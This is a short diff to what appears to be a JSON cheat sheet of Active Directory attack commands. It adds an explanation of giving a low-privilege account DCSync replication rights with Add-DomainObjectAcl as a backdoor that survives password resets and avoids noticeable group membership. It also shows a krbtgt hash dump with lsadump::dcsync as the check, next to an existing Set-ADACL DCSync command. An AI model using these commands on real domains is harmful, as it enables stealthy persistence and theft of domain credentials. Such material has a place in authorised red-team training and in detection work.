@@ -116,5 +116,6 @@
       "label": "AD Module - Set-ADACL GUIDRight DCSync",
       "command": "Set-ADACL -SamAccountName <user> -DistinguishedName 'DC=<domain>' -GUIDRight DCSync -Verbose"
     }
-  ]
+  ],
+  "explain": "Grants a controlled low-priv user DCSync rights via WriteDACL/GenericAll, a backdoor that survives password resets:\n  Add-DomainObjectAcl       write an ACE onto an object\n  -TargetIdentity 'DC=<domain>,DC=local'   the domain root (where replication rights live)\n  -PrincipalIdentity '<user>'   the account you keep control of\n  -Rights DCSync           the DS-Replication-Get-Changes(-All) rights\nAfterwards that ordinary user can DCSync the domain at will (verify with lsadump::dcsync /user:krbtgt) - no group membership to notice."
 }
